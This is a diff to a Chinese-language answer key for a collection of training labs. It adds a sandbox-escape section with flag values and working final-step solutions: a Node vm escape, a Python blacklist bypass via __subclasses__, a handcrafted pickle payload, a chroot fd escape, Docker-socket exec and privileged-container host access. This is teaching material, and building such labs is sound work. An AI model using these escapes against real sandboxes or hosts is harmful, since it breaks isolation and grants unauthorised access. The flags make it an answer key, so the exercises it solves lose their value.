@@ -5,7 +5,8 @@
 > `README.md` 和页面里的提示中都有，答案里只补最后一步。
 
 靶场按难度大致排：DVWA（基础）→ JWT / XXE（Web 常规漏洞）→
-反序列化 / Gopher（进阶）→ webshell-hunt（应急响应）→ ARP（网络层）。
+反序列化 / Gopher（进阶）→ webshell-hunt（应急响应）→ 沙箱逃逸（进阶）→
+ARP（网络层）。
 
 ---
 
@@ -29,6 +30,12 @@
 | JWT | L2 | `FLAG{jwt_l2_alg_none_bypass}` | `/flag_l2` |
 | JWT | L3 | `FLAG{jwt_l3_rs256_to_hs256_confusion}` | `/flag_l3` |
 | JWT | L4 | `FLAG{jwt_l4_kid_path_traversal}` | `/flag_l4` |
+| 沙箱逃逸 | L1（Node vm） | `FLAG{sandbox_escape_node_vm_1a2b}` | sbox-web `/flag_l1` |
+| 沙箱逃逸 | L2（Python 黑名单） | `FLAG{sandbox_escape_py_blacklist_3c4d}` | sbox-web `/flag_l2` |
+| 沙箱逃逸 | L3（pickle 白名单） | `FLAG{sandbox_escape_pickle_attr_5e6f}` | sbox-web `/flag_l3` |
+| 沙箱逃逸 | L4（chroot） | `FLAG{sandbox_escape_chroot_fd_7a8b}` | sbox-web `/flag_l4`（jail 外） |
+| 沙箱逃逸 | L5（docker.sock） | `FLAG{sandbox_escape_docker_sock_9c0d}` | sbox-vault `/flag_l5` |
+| 沙箱逃逸 | L6（privileged） | `FLAG{sandbox_escape_privileged_host_1e2f}` | 宿主 `/lab-escape/l6.flag` |
 
 DVWA、webshell-hunt、ARP 没有 flag：
 DVWA 是 18 个模块的练习场，webshell-hunt 的目标是「找齐 9 处后门」，
@@ -444,7 +451,89 @@ docker exec arp-gw cat /sys/class/net/eth0/address   # 真实 MAC，别抄死值
 
 ---
 
-## 八、一键验证
+## 八、Sandbox Escape（沙箱逃逸）
+
+入口 `8900`（L1~L4 页面），L5 / L6 在容器里。
+六关的完整解读见 `sandbox-escape/answer/ANSWERS.md`，这里只给最后一步。
+
+### L1 —— Node.js `vm`
+
+沙箱里的对象属于宿主 Realm，`constructor.constructor` 就是宿主的 `Function`：
+
+```js
+this.constructor.constructor('return process')()
+    .mainModule.require('fs').readFileSync('/flag_l1', 'utf8')
+```
+
+### L2 —— Python 关键字黑名单
+
+黑名单拦的是字面量，`__class__` 拼出来就行；`getattr` 没被拉黑，正好能把
+拼出来的名字当属性名：
+
+```python
+t = getattr((), '_' + '_class_' + '_')
+o = getattr(t, '_' + '_ba' + 'ses_' + '_')[0]
+for k in getattr(o, '_' + '_sub' + 'classes_' + '_')():
+    i = getattr(k, '_' + '_in' + 'it_' + '_', None)
+    g = getattr(i, '_' + '_glo' + 'bals_' + '_', None)
+    if isinstance(g, dict) and 'system' in g:
+        g['system']('cat /flag_l2'); break
+```
+
+### L3 —— pickle 模块白名单
+
+白名单只看 `module`，`name` 是限定名，点号会被 `_getattribute()` 展开。
+`models.py` 顶部 `import subprocess`，所以：
+
+```python
+import base64
+def su(s):
+    b = s.encode(); return b"\x8c" + bytes([len(b)]) + b
+payload = (b"\x80\x04" + su("models") + su("subprocess.getoutput")
+           + b"\x93" + su("cat /flag_l3") + b"\x85" + b"R.")
+print(base64.b64encode(payload).decode())
+```
+
+### L4 —— chroot
+
+父进程在 chroot 前打开了 `/` 并 `dup2` 成 fd 3。`chroot` 不回收 fd：
+
+```python
+os.fchdir(3); os.chroot("."); os.chdir("/")
+print(open("/flag_l4").read())
+```
+
+### L5 —— Docker Socket
+
+```bash
+docker exec -it sbox-sock bash
+docker exec sbox-vault cat /flag_l5
+```
+
+纯 API 的走法（`exec` 是"创建 + 启动"两段）：
+
+```bash
+curl --unix-socket /var/run/docker.sock -s -H 'Content-Type: application/json' \
+     -d '{"AttachStdout":true,"Cmd":["cat","/flag_l5"]}' \
+     http://localhost/containers/sbox-vault/exec
+curl --unix-socket /var/run/docker.sock -s -H 'Content-Type: application/json' \
+     -d '{"Detach":false,"Tty":true}' http://localhost/exec/<ExecId>/start
+```
+
+### L6 —— privileged + hostPID
+
+```bash
+docker exec -it sbox-priv bash
+cat /proc/1/root/lab-escape/l6.flag
+```
+
+`--pid=host` 让 `/proc` 里出现宿主的进程表，`--privileged` 给了穿过
+`/proc/<pid>/root` 的 capability —— 宿主根目录就到手了。
+macOS / Windows 上"宿主"是 Docker Desktop 的 Linux VM。
+
+---
+
+## 九、一键验证
 
 各靶场自带纯标准库的验证脚本，环境起来后直接跑：
 
@@ -455,6 +544,7 @@ cd xxe && python3 poc/xxe_exp.py                      # XXE 五关
 cd jwt && python3 poc/jwt_exp.py                      # JWT 四关
 cd gopher/poc && python3 01_gopher_raw.py             # 六关按编号逐个跑
 cd webshell-hunt && python3 hunt.py --docker webshell-hunt
+cd sandbox-escape && python3 poc/verify.py             # 沙箱逃逸 L1~L4
 ```
 
 都没有第三方依赖，`urllib` + `socket` + `hmac` 手写。
